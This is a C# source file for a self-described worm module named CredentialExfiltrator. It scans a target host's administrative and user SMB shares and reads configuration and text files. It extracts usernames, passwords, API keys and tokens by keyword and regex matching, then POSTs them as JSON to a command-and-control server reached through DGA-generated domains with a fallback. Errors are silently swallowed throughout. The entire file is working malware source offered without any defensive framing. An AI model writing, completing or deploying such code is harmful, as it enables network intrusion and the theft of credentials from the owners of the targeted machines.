using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;
using System.Net;  // Added this for IPEndPoint
using System.Text.RegularExpressions;
using System.Security.Cryptography;

namespace XYZ.modules.worm
{
    public class CredentialExfiltrator
    {
        private const string FALLBACK_DOMAIN = "127.0.0.1:8000";
        
        public void TryCredentialHarvesting(string targetIP)
        {
            try
            {
                // Common shares to check for credentials
                string[] sharesToCheck = { "C$", "ADMIN$", "IPC$", "Users", "Documents" };
                
                foreach (string share in sharesToCheck)
                {
                    string sharePath = "\\\\" + targetIP + "\\" + share;
                    
                    if (IsShareAccessible(sharePath))
                    {
                        // List files in share
                        try
                        {
                            string[] files = Directory.GetFiles(sharePath, "*", SearchOption.AllDirectories);
                            foreach (string filePath in files)
                            {
                                ExfiltrateCredentials(filePath);
                            }
                        }
                        catch
                        {
                            // Continue to next share if this one fails
                        }
                    }
                }
            }
            catch
            {
                // Silent fail
            }
        }
        
        // Check if a share is accessible
        private bool IsShareAccessible(string sharePath)
        {
            try
            {
                // Check if the share path exists and is accessible
                if (Directory.Exists(sharePath))
                {
                    return true;
                }
                
                // Try to access the share with a simple operation
                string[] files = Directory.GetFiles(sharePath, "*", SearchOption.TopDirectoryOnly);
                return files.Length >= 0; // If we can list files, it's accessible
            }
            catch
            {
                return false;
            }
        }

        // Exfiltrate credentials from found files
        private void ExfiltrateCredentials(string filePath)
        {
            try
            {
                // Check if file is of interest based on extension
                string extension = Path.GetExtension(filePath).ToLower();
                string[] interestingExtensions = { ".txt", ".json", ".xml", ".config", ".ini", ".yaml", ".yml", ".csv" };
                
                bool isInteresting = Array.Exists(interestingExtensions, ext => ext == extension);
                
                // Also check for files with credential-related names
                string fileName = Path.GetFileName(filePath).ToLower();
                string[] credentialKeywords = { "password", "credential", "secret", "key", "token", "auth" };
                bool hasCredentialKeyword = Array.Exists(credentialKeywords, keyword => fileName.Contains(keyword));
                
                if (isInteresting || hasCredentialKeyword)
                {
                    // Read the file content
                    string fileContent = File.ReadAllText(filePath);
                    
                    // Parse credentials based on file type
                    Dictionary<string, string> credentials = ParseCredentials(fileContent, Path.GetFileName(filePath));
                    
                    if (credentials.Count > 0)
                    {
                        // Send credentials to C&C server
                        SendCredentialsToC2(credentials, filePath);
                    }
                }
            }
            catch
            {
                // Silent fail
            }
        }

        // Parse credentials from file content
        private Dictionary<string, string> ParseCredentials(string content, string fileName)
        {
            Dictionary<string, string> credentials = new Dictionary<string, string>();
            
            try
            {
                // Check if it's a JSON file
                if (fileName.EndsWith(".json", StringComparison.OrdinalIgnoreCase))
                {
                    // Parse JSON credentials
                    ParseJsonCredentials(content, credentials);
                }
                else
                {
                    // Parse plain text credentials
                    ParsePlainTextCredentials(content, credentials);
                }
                
                // Also look for common credential patterns
                ParseRegexCredentials(content, credentials);
            }
            catch
            {
                // Silent fail
            }
            
            return credentials;
        }

        // Parse JSON credentials
        private void ParseJsonCredentials(string content, Dictionary<string, string> credentials)
        {
            try
            {
                // Look for common credential fields in JSON
                string[] credentialFields = { "username", "password", "api_key", "token", "secret", "access_key", "secret_key", "client_id", "client_secret" };
                
                // Simple string search for credential fields
                foreach (string field in credentialFields)
                {
                    int fieldIndex = content.IndexOf("\"" + field + "\"", StringComparison.OrdinalIgnoreCase);
                    if (fieldIndex >= 0)
                    {
                        // Extract the value
                        int valueStart = content.IndexOf(':', fieldIndex) + 1;
                        if (valueStart > 0)
                        {
                            int valueEnd = content.IndexOfAny(new char[] { ',', '}', ']' }, valueStart);
                            if (valueEnd > valueStart)
                            {
                                string value = content.Substring(valueStart, valueEnd - valueStart).Trim();
                                // Remove quotes if present
                                value = value.Trim(' ', '"', '\'');
                                if (!string.IsNullOrEmpty(value))
                                {
                                    credentials[field] = value;
                                }
                            }
                        }
                    }
                }
            }
            catch
            {
                // Silent fail
            }
        }

        // Parse plain text credentials
        private void ParsePlainTextCredentials(string content, Dictionary<string, string> credentials)
        {
            try
            {
                // Split content into lines
                string[] lines = content.Split(new char[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
                
                // Common credential patterns
                string[] usernamePatterns = { "user", "username", "login", "email" };
                string[] passwordPatterns = { "pass", "password", "pwd", "secret" };
                string[] tokenPatterns = { "token", "api", "key", "client" };
                
                foreach (string line in lines)
                {
                    string trimmedLine = line.Trim();
                    if (string.IsNullOrEmpty(trimmedLine)) continue;
                    
                    // Check for key=value or key: value patterns
                    string[] separators = { "=", ":" };
                    foreach (string separator in separators)
                    {
                        int sepIndex = trimmedLine.IndexOf(separator);
                        if (sepIndex > 0)
                        {
                            string key = trimmedLine.Substring(0, sepIndex).Trim();
                            string value = trimmedLine.Substring(sepIndex + 1).Trim();
                            
                            // Remove quotes if present
                            value = value.Trim(' ', '"', '\'');
                            
                            // Check if key matches credential patterns
                            string keyLower = key.ToLower();
                            if (Array.Exists(usernamePatterns, pattern => keyLower.Contains(pattern)))
                            {
                                credentials["username"] = value;
                            }
                            else if (Array.Exists(passwordPatterns, pattern => keyLower.Contains(pattern)))
                            {
                                credentials["password"] = value;
                            }
                            else if (Array.Exists(tokenPatterns, pattern => keyLower.Contains(pattern)))
                            {
                                credentials[key] = value;
                            }
                        }
                    }
                }
            }
            catch
            {
                // Silent fail
            }
        }
        
        // Parse credentials using regex patterns
        private void ParseRegexCredentials(string content, Dictionary<string, string> credentials)
        {
            try
            {
                // Common regex patterns for credentials
                Dictionary<string, string> patterns = new Dictionary<string, string>
                {
                    { "email", @"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" },
                    { "password", @"(?:password|pwd)\s*[:=]\s*[""']?([^""'\r\n]+)[""']?" },
                    { "api_key", @"(?:api[_-]?key)\s*[:=]\s*[""']?([^""'\r\n]+)[""']?" },
                    { "token", @"(?:token|access[_-]?token)\s*[:=]\s*[""']?([^""'\r\n]+)[""']?" },
                    { "secret", @"(?:secret|secret[_-]?key)\s*[:=]\s*[""']?([^""'\r\n]+)[""']?" }
                };
                
                foreach (var pattern in patterns)
                {
                    Match match = Regex.Match(content, pattern.Value, RegexOptions.IgnoreCase);
                    if (match.Success)
                    {
                        string value = match.Groups[1].Value.Trim(' ', '"', '\'');
                        if (!string.IsNullOrEmpty(value))
                        {
                            credentials[pattern.Key] = value;
                        }
                    }
                }
            }
            catch
            {
                // Silent fail
            }
        }

        // Send credentials to C&C server
        private void SendCredentialsToC2(Dictionary<string, string> credentials, string sourceFile)
        {
            try
            {
                // Create credential payload
                var payload = new
                {
                    action = "credentials",
                    source = sourceFile,
                    target = GetLocalIPAddress(),
                    credentials = credentials,
                    timestamp = DateTime.UtcNow
                };

                string json = new System.Web.Script.Serialization.JavaScriptSerializer().Serialize(payload);
                var content = new StringContent(json, Encoding.UTF8, "application/json");

                // Try DGA domains first, fallback to original if all fail
                DGAServices dgaService = new DGAServices();
                string[] domainsToTry = {
                    dgaService.GenerateDgaDomain(0),      // Today's domain
                    dgaService.GenerateDgaDomain(-1),     // Yesterday's domain
                    dgaService.GenerateDgaDomain(1),      // Tomorrow's domain
                    FALLBACK_DOMAIN            // Fallback
                };

                HttpClient httpClient = new HttpClient();
                HttpResponseMessage response = null;

                foreach (string domain in domainsToTry)
                {
                    try
                    {
                        string finalUrl = "https://" + domain + "/api/credentials";
                        response = httpClient.PostAsync(finalUrl, content).Result;
                        
                        if (response != null && response.IsSuccessStatusCode)
                        {
                            break; // Success, exit loop
                        }
                    }
                    catch
                    {
                        // Continue to next domain
                        continue;
                    }
                }
            }
            catch
            {
                // Silent fail
            }
        }

        // Get local IP address
        private string GetLocalIPAddress()
        {
            try
            {
                using (System.Net.Sockets.Socket socket = new System.Net.Sockets.Socket(
                    System.Net.Sockets.AddressFamily.InterNetwork, 
                    System.Net.Sockets.SocketType.Dgram, 0))
                {
                    socket.Connect("8.8.8.8", 65530);
                    IPEndPoint endPoint = socket.LocalEndPoint as IPEndPoint;
                    return (endPoint != null) ? endPoint.Address.ToString() : "";
                }
            }
            catch
            {
                return "";
            }
        }
        
        // Additional helper methods for real implementations
        
        private bool IsFileAccessible(string filePath)
        {
            try
            {
                // Check if file is accessible
                using (FileStream fs = File.OpenRead(filePath))
                {
                    return true;
                }
            }
            catch
            {
                return false;
            }
        }
        
        private string HashCredentialValue(string value)
        {
            try
            {
                // Hash credential value for secure storage/transmission
                using (SHA256 sha256 = SHA256.Create())
                {
                    byte[] hashedBytes = sha256.ComputeHash(Encoding.UTF8.GetBytes(value));
                    return Convert.ToBase64String(hashedBytes);
                }
            }
            catch
            {
                return "";
            }
        }
        
        private bool IsValidCredentialFormat(string key, string value)
        {
            try
            {
                // Validate credential format based on key type
                switch (key.ToLower())
                {
                    case "email":
                        return Regex.IsMatch(value, @"^[^@]+@[^@]+\.[^@]+$");
                    case "password":
                        return value.Length >= 4; // Simple validation
                    case "api_key":
                    case "token":
                    case "secret":
                        return value.Length >= 8; // Simple validation
                    default:
                        return !string.IsNullOrEmpty(value);
                }
            }
            catch
            {
                return false;
            }
        }
    }
}